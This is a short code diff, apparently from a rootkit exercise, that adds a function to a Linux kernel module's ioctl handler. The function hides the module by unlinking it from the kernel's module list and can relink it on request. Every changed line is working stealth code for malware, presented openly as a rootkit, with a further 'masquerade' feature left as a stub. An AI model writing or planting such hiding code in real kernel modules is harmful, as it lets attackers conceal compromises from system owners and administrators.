@@ -34,6 +34,21 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
     return 0;
 }
 
+/* The rootkit module should be visible by default. */
+static bool is_hidden = false;
+static struct list_head *prev_module = NULL;
+
+static void toggle_module_visibility(void) {
+    if (is_hidden) {
+        list_add(&THIS_MODULE->list, prev_module);
+        prev_module = NULL;
+    } else {
+        prev_module = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+    }
+    is_hidden = !is_hidden;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg) {
     long ret = 0;
@@ -42,7 +57,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
     switch (ioctl) {
     case IOCTL_MOD_HIDE:
-        // do something
+        toggle_module_visibility();
         break;
     case IOCTL_MOD_MASQ:
         // do something
